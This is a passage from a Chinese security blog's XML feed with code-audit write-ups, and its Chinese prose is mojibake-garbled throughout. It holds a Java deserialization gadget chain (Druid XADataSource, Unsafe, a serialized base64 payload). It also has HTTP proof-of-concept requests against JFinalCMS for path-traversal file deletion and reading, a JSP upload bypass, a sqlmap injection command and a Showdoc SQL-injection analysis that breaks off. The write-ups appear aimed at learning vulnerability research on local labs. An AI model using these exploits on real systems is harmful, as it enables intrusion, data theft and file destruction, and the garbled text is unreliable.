class="literal">true</span>);</span><br><span class="line">        initedLatch.set(druidXADataSource,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Field field=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        Field field1=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Serialize(hashtable);</span></span><br><span class="line">        Unserialize(<span class="string">&quot;H4sIAAAAAAAAAKVZXWwcVxW+69iJYzv+i2MnaZIacJuEtLslCW0aKyS.....&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åŒ…è£…æˆZIP</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayOutputStream</span> <span class="variable">baos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPOutputStream</span> <span class="variable">gos3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos3);</span><br><span class="line">        gos3.write(baos.toByteArray());</span><br><span class="line">        gos3.finish();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64str</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos3.toByteArray());</span><br><span class="line">        System.out.println(base64str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Unserialize</span><span class="params">(String base64str)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64str));</span><br><span class="line">        <span class="keyword">final</span> <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(bais);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(gis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title function_">getUnsafe</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span>(Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://blog.csdn.net/qq_51295677/article/details/131789320">å¸†è½¯ FineReport&#x2F;FineBI channelååºåˆ—åŒ–æ¼æ´åˆ†æ_å¸†è½¯ååºåˆ—åŒ–-CSDNåšå®¢</a></p><p><a href="https://forum.butian.net/share/2806">https://forum.butian.net/share/2806</a></p><p><a href="https://xz.aliyun.com/t/14800">https://xz.aliyun.com/t/14800</a></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JFinalCMSå®¡è®¡ç»ƒä¹ </title>
      <link href="/2024/07/JFinalCMS%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/07/JFinalCMS%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><strong>æœ¬æ–‡é¦–å‘äºå…ˆçŸ¥ç¤¾åŒºï¼š<a href="https://xz.aliyun.com/t/14957">https://xz.aliyun.com/t/14957</a></strong></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çœ‹åˆ°æ˜Ÿçƒå‘å¸ƒäº†ä¸€ä¸ªä½œä¸šï¼Œç”±äºè€ƒè¯•æ²¡åŠæ—¶å¼„ã€‚æ‰€ä»¥å°±è‡ªå·±éšä¾¿çœ‹çœ‹äº†ï¼Œè¿™å¥—ç³»ç»Ÿç¡®å®æ¼æ´å¾ˆå¤šï¼Œå¯ä»¥è¯´æ˜¯é¶åœºã€‚ã€‚ã€‚å±é™©æ“ä½œå‡ ä¹éƒ½æ²¡æœ‰åšè¿‡æ»¤ï¼Œè€Œä¸”å¾ˆä¹…æ²¡æ›´æ–°äº†</p><h2 id="åå°ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#åå°ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶åˆ é™¤"></a>åå°ä»»æ„æ–‡ä»¶åˆ é™¤</h2><p>è¿™ä¸ªæ´æäº†cveï¼Œçœ‹å¤§å®¶éƒ½åœ¨æ°´æˆ‘ä¹Ÿæ°´ä¸€ä¸ª</p><p>æ¼æ´å¾ˆç®€å•ï¼Œç”šè‡³ä¸éœ€è¦ç™½ç›’ï¼Œé»‘ç›’èƒ½ç›´æ¥æµ‹å‡ºæ¥ï¼Œä½†æ˜¯ä»£ç å®¡è®¡è¿˜æ˜¯çœ‹ä»£ç å§ï¼Œæˆ‘å®¡è¿™ä¸ªçš„æ—¶å€™ä¹Ÿæ˜¯ç›´æ¥çœ‹çš„ä»£ç ï¼Œä»£ç ä½ç½®åœ¨<code>src/main/java/com/cms/controller/admin/DatabaseController.java</code> æ–‡ä»¶ä¸‹çš„<code>/delete</code> æ¥å£</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291506650.png" alt="Untitled"></p><p>è·Ÿè¿›è¿™ä¸ªdeleteæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507703.png" alt="Untitled"></p><p>å¯ä»¥çœ‹åˆ°å¯¹è¿™ä¸ªå‚æ•°æ²¡æœ‰åšä»»ä½•çš„æ£€æµ‹ï¼Œä»…ä»…åªçœ‹äº†æ–‡ä»¶æ˜¯å¦å­˜åœ¨</p><p>pocå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/database/delete HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;113&quot;</span>, <span class="string">&quot;Not-A.Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">113.0</span><span class="number">.5672</span><span class="number">.127</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?<span class="number">1</span></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: JSESSIONID=6DD997E088E0DCBF8F72AF2897F1B845</span><br><span class="line">Connection: close</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">37</span></span><br><span class="line"></span><br><span class="line">name=../../../../../../../../flag.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507174.png" alt="Untitled"></p><p>æ‰§è¡Œå</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507883.png" alt="Untitled"></p><p>ç„¶åå°±æ˜¯issueä¸Šçš„ä¸€äº›æ¼æ´äº†ï¼Œå­¦ä¹ ä¸€ä¸‹</p><h2 id="å‰å°ä»»æ„æ–‡ä»¶è¯»å–"><a href="#å‰å°ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="å‰å°ä»»æ„æ–‡ä»¶è¯»å–"></a>å‰å°ä»»æ„æ–‡ä»¶è¯»å–</h2><p>ä¹Ÿæ˜¯æ–‡ä»¶åæ²¡æœ‰åšä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥å¯ä»¥è¯»å–æˆåŠŸ</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507659.png" alt="Untitled"></p><p>payloadå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /common/file/download?fileKey=../../../../../../../flag.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8888</span></span><br><span class="line">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;113&quot;</span>, <span class="string">&quot;Not-A.Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span></span><br><span class="line">sec-ch-ua-mobile: ?<span class="number">0</span></span><br><span class="line">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">113.0</span><span class="number">.5672</span><span class="number">.127</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?<span class="number">1</span></span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507402.png" alt="Untitled"></p><h2 id="ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><p>è¿™ä¸ªä¹Ÿæ˜¯issueé‡Œé¢çš„</p><p>åœ¨æ–‡ä»¶<code>com/cms/controller/admin/FileController.java</code> ä¸‹å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ </p><p>ä¸­é—´å”¯ä¸€çš„æ£€éªŒæ˜¯ä¸€ä¸ªæ°´å°ç›¸å…³çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(config.getIsWatermarkEnabled() &amp;&amp; ArrayUtils.contains(imageSuffixs, suffix.toLowerCase()))&#123;</span><br><span class="line">            String watermarkImage = config.getWatermarkImage();</span><br><span class="line">            String watermarkPosition = config.getWatermarkPosition();</span><br><span class="line">            File watermarkImageFile = new File(PathUtils.getWebRootPath()+watermarkImage);</span><br><span class="line">            String sourceFileName = newFileBaseName+<span class="string">&quot;_source.&quot;</span>+suffix;</span><br><span class="line">            File sourceFile = new File(PathUtils.getWebRootPath()+<span class="string">&quot;/&quot;</span>+CommonConstant.UPLOAD_PATH+<span class="string">&quot;/&quot;</span>+sourceFileName);</span><br><span class="line">            newFile.renameTo(sourceFile);</span><br><span class="line">            ImageUtils.addWatermark(sourceFile, newFile, watermarkImageFile, watermarkPosition);</span><br><span class="line">            FileUtils.deleteQuietly(sourceFile);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªifæ— æ‰€è°“ï¼Œå³ä½¿ä¸æ‰§è¡Œä¹Ÿèƒ½æ­£å¸¸ä¸Šä¼ </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291507783.png" alt="Untitled"></p><p>å› ä¸ºæœ‰äº›è¡¨å•çš„å¤„ç†æ‡’å¾—å†™ï¼Œæ‰€ä»¥ç›´æ¥æŠ“ä¸Šä¼ åŒ…å³å¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508985.png" alt="Untitled"></p><p>å¯ä»¥çœ‹åˆ°ç›´æ¥ä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯springbootæ˜¯ä¸èƒ½è§£æjspçš„ï¼Œæ‰€ä»¥è¿™æ ·ä¸Šä¼ äº†ä¹Ÿæ²¡ç”¨ï¼Œè®¿é—®æ˜¯ç›´æ¥ä¸‹è½½ï¼Œä¸çŸ¥é“é‚£ä¸ªissueæ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Œåé¢çœ‹äº†ä¸€ä¸‹ç”¨tomcatå¯åŠ¨éƒ¨ç½²å³å¯è§£æjspï¼Œä½†æ˜¯å¤šäº†ä¸€ä¸ªiféœ€è¦ç»•è¿‡</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291545157.png" alt="image-20240629154500379"></p><p>ä»”ç»†çœ‹äº†ä¸€ä¸‹é‚£ä¸ªissueï¼Œé‚£ä¸ªæ˜¯æ²¡æœ‰ä¸‹é¢è¿™å¥ä»£ç çš„ï¼Œåº”è¯¥æ˜¯ä½œè€…æ›´æ–°äº†ä¸€ä¸‹ï¼Œä¸”ifé€»è¾‘å¤„ç†ç¨å¾®ä¸ä¸€æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UploadFile uploadFile = getFile();</span><br></pre></td></tr></table></figure><p>issueä»£ç å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291545071.png" alt="image-20240629154528516"></p><p>æ²¡æƒ³åˆ°ä»€ä¹ˆç»•è¿‡æ–¹æ³•ï¼Œå¦å¤–jfinalé»˜è®¤ä¸å…è®¸ç›´æ¥è®¿é—®jspæ–‡ä»¶ï¼Œè¿™ç§ç»•è¿‡ç›´æ¥åŠ ä¸ªåˆ†å·å³å¯ï¼Œå³<code>1.jsp;</code></p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291546007.png" alt="image-20240629154603085"></p><p>è¿™ä¸ªæ˜¯æˆ‘æ‰‹åŠ¨åˆ›å»ºçš„ï¼Œä¼ æ˜¯ä¼ ä¸äº†ä¸€ç‚¹ï¼Œå¦‚æœæœ‰å¤§ä½¬çŸ¥é“æ€ä¹ˆç»•è¿˜è¯·æŒ‡ç‚¹ä¸€äºŒ</p><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><p>åœ¨springbootä¸­ä½¿ç”¨äº†mybatis-plusï¼Œä½†æ˜¯åœ¨è¿™ä¸ªé¡¹ç›®çš„<strong>JFinalç‰ˆæœ¬</strong>å¹¶æ²¡æœ‰ä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨ä¸€äº›æ¥å£é€ æˆäº†sqlæ³¨å…¥</p><p>é¦–å…ˆæ˜¯åœ¨<code>com/cms/controller/admin/AdminController.java</code> æ–‡ä»¶ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508095.png" alt="Untitled"></p><p>è¿™é‡Œindexæ¥å£å³é»˜è®¤æ¥å£ï¼Œæ¥æ”¶çš„ä¸‰ä¸ªå‚æ•°éƒ½è¿›å…¥äº†findPageæ–¹æ³•ï¼Œç›´æ¥è·Ÿè¿›è¿™ä¸ªæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508153.png" alt="Untitled"></p><p>å¯ä»¥çœ‹åˆ°ä¸‰ä¸ªå‚æ•°éƒ½ç›´æ¥è¿›å…¥äº†sqlè¯­å¥ä¸­æ— ä»»ä½•è¿‡æ»¤ï¼Œè¿™é‡Œå› ä¸ºç¼–ç çš„åŸå› å¯¼è‡´å¸ƒå°”ç›²æ³¨å›æ˜¾ç»“æœä¸æ˜¯å¾ˆå‡†ç¡®æ‰€ä»¥ç›´æ¥ç”¨å»¶æ—¶æ³¨å…¥å³å¯</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508965.png" alt="Untitled"></p><p>æ”¾sqlmapè·‘ä¸€ä¸‹å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8081</span>/admin/admin?name=r --dbs --cookie JSESSIONID=ABB781F07C8BD899D6B9BCE286EAA9F0 --batch</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406291508062.png" alt="Untitled"></p><p>å…¶å®ƒåœ°æ–¹è¿˜æœ‰å¾ˆå¤šï¼Œéƒ½æ˜¯ç›´æ¥ç”¨äº†findPageæ–¹æ³•ï¼Œæ²¡æœ‰åšå¤„ç†å°±ä¸ä¸€ä¸ªä¸ªçœ‹äº†</p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Showdoc &lt;= 3.2.5 SQLæ³¨å…¥åŠååºåˆ—åŒ–åˆ†æ</title>
      <link href="/2024/06/Showdoc3-2-5-SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
      <url>/2024/06/Showdoc3-2-5-SQL%E6%B3%A8%E5%85%A5%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152000088.png" alt="Untitled"></p><h2 id="SQLæ³¨å…¥ç‚¹å¯»æ‰¾"><a href="#SQLæ³¨å…¥ç‚¹å¯»æ‰¾" class="headerlink" title="SQLæ³¨å…¥ç‚¹å¯»æ‰¾"></a>SQLæ³¨å…¥ç‚¹å¯»æ‰¾</h2><p>å½“æ—¶çš„é€šæŠ¥æ˜¯è¿™ä¸ªï¼Œå½“æ—¶åœ¨3.2.5ç‰ˆæœ¬æ ¹æœ¬æ²¡æœ‰ä¿®å¤è¿™ä¸ªsqlæ³¨å…¥ï¼Œå¯¹ç€commitæäº¤çš„é‚£å‡ ä¸ªè·¯ç”±ä¸€ç›´æ‰¾ä¹Ÿæ²¡æ‰¾å‡ºæ³¨å…¥ç‚¹ã€‚ã€‚ã€‚ä¸ä¹…åå‘å¸ƒäº†3.2.6ç‰ˆæœ¬ä¸€çœ¼å°±èƒ½çœ‹å‡ºæ³¨å…¥ç‚¹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001791.png" alt="Untitled"></p><p>å¾ˆæ˜æ˜¾çœ‹åˆ°å¯¹<code>item_id</code> è¿›è¡Œäº†ä¿®å¤åšäº†åº”è¯¥æ˜¯é¢„å¤„ç†ï¼Œæ¥åˆ°æºç çœ‹ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001062.png" alt="Untitled"></p><p>è®°å¾—å½“æ—¶åˆ†æçš„æ—¶å€™å¯¹<code>page_id/d</code> è¿™ç§å†™æ³•çœ‹äº†å¾ˆä¹…ï¼Œåé¢è°ƒè¯•çš„æ—¶å€™ä¸€æ­¥æ­¥è·Ÿè¿›å»æ‰æ˜ç™½ä½œç”¨ï¼Œå…¶å®å°±æ˜¯åšå¼ºè½¬å¤„ç†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001041.png" alt="Untitled"></p><p>æ‰€æœ‰è¿™é‡Œçš„<code>I</code>æ¥æ”¶çš„å‚æ•°åé¢åªèƒ½ä¸ºç©ºæˆ–è€…sè¿™ä¸¤ç§ï¼Œå¦åˆ™å°±ä¼šè¢«å¼ºè½¬ä¸ºå…¶å®ƒçš„ï¼Œå¾ˆæ˜æ˜¾æ²¡æœ‰åšä»»ä½•å¤„ç†ï¼Œç›´æ¥æ‹¼æ¥è¿›äº†sqlè¯­å¥ä¸­ç¬¦åˆè¦æ±‚å³æ³¨å…¥ç‚¹</p><h3 id="æ³¨å…¥è¿‡ç¨‹"><a href="#æ³¨å…¥è¿‡ç¨‹" class="headerlink" title="æ³¨å…¥è¿‡ç¨‹"></a>æ³¨å…¥è¿‡ç¨‹</h3><p>åœ¨æ³¨å…¥çš„è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€ä¸ªç‚¹å°±æ˜¯ä¸‹é¢è¿™æ®µæ£€æµ‹ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">D</span>(<span class="string">&quot;Captcha&quot;</span>)-&gt;<span class="title function_ invoke__">check</span>(<span class="variable">$captcha_id</span>, <span class="variable">$captcha</span>)) &#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sendError</span>(<span class="number">10206</span>, <span class="title function_ invoke__">L</span>(<span class="string">&#x27;verification_code_are_incorrect&#x27;</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æ—¶åŠå¤©æ²¡ææ‡‚è¿™æ€ä¹ˆç»•ï¼Œåé¢ç¿»è¯‘äº†ä¸€ä¸‹è¿™ä¸ªå•è¯ï¼Œå…¶å®å°±æ˜¯éªŒè¯ç ã€‚ã€‚ã€‚é‚£ä¹ˆå°±åªéœ€è¦å»å¼„ä¸ªéªŒè¯ç å°±è¡Œï¼ŒæŠ“ä¸€ä¸‹éªŒè¯ç æ¥å£ï¼Œå‘ç°è¯·æ±‚éªŒè¯ç åˆ†äº†ä¸¤éƒ¨</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001521.png" alt="Untitled"></p><p>ç¬¬ä¸€æ­¥å°±æ˜¯å…ˆå¾—åˆ°è¿™ä¸ª<code>captcha_id</code> ï¼Œç„¶åæ ¹æ®è¿™ä¸ªidå†å»è¯·æ±‚éªŒè¯ç </p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001090.png" alt="Untitled"></p><p>éªŒè¯ç ç”¨ä¸€æ¬¡å°±å¤±æ•ˆäº†</p><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202406152001441.png" alt="Untitled"></p><p>æˆåŠŸæŠ¥é”™ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ³¨å‡ºæ•°æ®äº†ï¼Œä½†æ˜¯è¿™ä¸ªéªŒè¯ç å¾—è§£å†³ä¸€ä¸‹ï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘å°çš®èµ·çš„ç¯å¢ƒåŠ è½½ç½‘é¡µæ…¢æ­»ï¼Œè§£å†³éªŒè¯ç æœ¬æ¥æ˜¯æƒ³ç€ç”¨<strong>captcha-killer-modified</strong>è¿™ä¸ªæ’ä»¶çš„ï¼Œä½†æ˜¯å®ƒæœ‰ä¸ªcaptcha_idè¿™æ ·å°±ä¸æ–¹ä¾¿äº†ï¼Œæ‰€ä»¥ç›´æ¥å†™è„šæœ¬åˆ©ç”¨ddddocrå»è¯†åˆ«éªŒè¯ç å³å¯ï¼Œè¿™ä¸ªè§£å†³ç®€å•ï¼Œä½†æ˜¯å› ä¸ºè¿™é‡Œæ˜¯ç›²æ³¨æ‰€ä»¥æ³¨å‡ºæ•°æ®å¾—æœ‰ä¸ªå¸ƒå°”æ¡ä»¶ï¼Œç”±äºæœ¬åœ°ç¯å¢ƒé—®é¢˜æ²¡èƒ½å¥½å¥½å¯¹æ•°æ®åº“è¿›è¡Œè°ƒè¯•ï¼Œæ— å¥ˆåªèƒ½çœ‹åˆ«äººæ€ä¹ˆå¼„çš„äº†ï¼Œé€ æˆå¸ƒå°”åˆ¤æ–­æ˜¯ç»“åˆä¸‹é¢è¿™é‡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$password</span> &amp;&amp; <span class="variable">$item</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session</span>(<span class="string">&quot;visit_item_&quot;</span> . <span class="variable">$item_id</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sendResult</span>(<span class="keyword">array</span>(<span class="string">&quot;refer_url&quot;</span> =&gt; <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$refer_url</span>)));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sendError</span>(<span class="number">10010</span>, <span class="title function_ invoke__">L</span>(<span class="string">&#x27;access_password_are_incorrect&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œpasswordæˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸º1ï¼Œé‚£ä¹ˆåªè¦<code>$item[&#39;password&#39;]</code> ä¸º1å³å¯è¿›å…¥ifä¸º0è¿›å…¥elseï¼Œæ‰€ä»¥è¿™é‡Œåªè¦æ„é€ 